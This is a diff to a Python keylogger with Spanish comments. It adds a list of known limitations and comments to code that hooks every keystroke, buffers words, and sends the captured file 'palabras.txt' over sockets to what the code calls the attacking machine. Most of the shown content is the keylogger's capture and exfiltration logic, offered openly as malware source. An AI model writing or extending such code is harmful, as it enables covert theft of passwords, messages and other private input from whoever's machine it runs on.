@@ -21,6 +21,15 @@ Testear primero las ip a las que se envian las cosas y dentro de la máquina "vi
 Si se deja la ip de esta máquina el fichero se mandará al repo directamente
 """
 
+
+"""
+ACLARACIONES A CORREGIR
+
+Actualmente el código no maneja ni caracteres especiales que usen shift+[tecla] ni cosas por el estilo.
+
+Tampoco maneja si el caracter es imprimible o no. 
+"""
+
 print ("KEYLOGGER")
 
 # Función que regista en una variable global las palabras pulsadas
@@ -38,6 +47,7 @@ def pulsación_tecla(tecla_pulsada):
 
 keyboard.hook(pulsación_tecla)
 
+# Función usada para guardar la palabra y escribirla una vez se pulse espacio
 def guardar_palabra(tecla_pulsada):
     match (tecla_pulsada):
         case 'space':
@@ -49,6 +59,7 @@ def reset_palabra():
     global palabra
     palabra = ""
 
+# El fichero temporal a la máquina atacante
 def enviar_archivo_sockets(fichero, ip, puerto):
     try:
         with open('palabras.txt', 'rb') as file:
